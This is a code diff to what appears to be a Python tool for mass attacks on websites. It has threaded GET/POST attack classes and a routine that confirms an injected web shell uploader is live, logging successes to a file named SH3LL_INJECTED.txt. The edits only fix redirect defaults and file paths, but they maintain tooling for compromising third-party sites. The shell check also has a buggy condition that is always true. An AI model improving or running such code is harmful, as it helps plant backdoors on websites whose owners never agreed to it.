@@ -137,7 +137,7 @@ class Threaded_GET:
         #self.Regex_payload = Regex_payload if Regex_payload else []
         self.results = {}
       
-        self.SET_Redirect = SET_REDIRECT if SET_REDIRECT else True 
+        self.SET_Redirect = True if SET_REDIRECT is None else SET_REDIRECT  
         self.SET_Proxies = CFG_PROXIES if CFG_PROXIES else NO_USED 
         self.sess_ = Mem_Sess
          
@@ -209,7 +209,7 @@ class Threaded_GET:
                 # self.results[self.vuln_path] = { 'domain': self.TAR_URL,
                 #     'error': RES_GET.status_code }
                 Report_Times = Printed_Value.get_time() 
-                Main_Worker.Saved_Result(r'DB_Results\Domain_DetectBot.txt', f'{Report_Times} | {RES_GET.status_code}', f'{self.TAR_URL}\n')
+                Main_Worker.Saved_Result(r'DB_Results/Domain_DetectBot.txt', f'{Report_Times} | {RES_GET.status_code}', f'{self.TAR_URL}\n')
                 
                 return
 
@@ -283,7 +283,7 @@ class Threaded_POST:
         self.delay_attack = CFG_DELAY_ATTACK if CFG_DELAY_ATTACK else 0   
     
         self.raw_body = CFG_RAW_BODY if CFG_RAW_BODY else []
-        self.SET_Redirect = SET_REDIRECT if SET_REDIRECT else True #Remembers Default (When allow_redirects is not used):
+        self.SET_Redirect = True if SET_REDIRECT is None else SET_REDIRECT   #Remembers Default allow_redirects is True:
         #print(self.SET_Redirect)
         self.SET_Proxies = CFG_Proxies if CFG_Proxies else NO_USED 
         
@@ -380,7 +380,7 @@ class Threaded_POST:
                 # self.results[self.vuln_path] = { 'domain': self.TAR_URL,
                 #     'error': RES_GET.status_code }
                 Report_Times = Printed_Value.get_time()
-                Main_Worker.Saved_Result(r'DB_Results\Domain_Detect_BOT.txt', f'{Report_Times} | {RES_POST.status_code}', f'{self.TAR_URL}\n')
+                Main_Worker.Saved_Result(r'DB_Results/Domain_Detect_BOT.txt', f'{Report_Times} | {RES_POST.status_code}', f'{self.TAR_URL}\n')
                 
                 return
             
@@ -496,7 +496,7 @@ def Func_ValidShell(SET_Timeout, Proxies_ON, Link_Shelled, Config_UA):
         if REZ_VALIDSHELL['resp']:
             #'WP_Burn was HERE' in str(REZ_VALIDSHELL['resp'].text) or
             if '>ErrorCool Uploader' in str(REZ_VALIDSHELL['resp'].text) or 'multipart/form-data' and 'method="POST' and 'value="Upload' in str(REZ_VALIDSHELL['resp'].text):
-                Main_Worker.Saved_Result(r'DB_Results\SH3LL_INJECTED.txt', f'{Link_Shelled}\n')
+                Main_Worker.Saved_Result(r'DB_Results/SH3LL_INJECTED.txt', f'{Link_Shelled}\n')
                 return True
             #if '>ErrorCool Uploader' in str(REZ_VALIDSHELL['resp'].text) or 'multipart/form-data' and 'method="POST' and 'value="Upload' in str(REZ_VALIDSHELL['resp'].text):
  
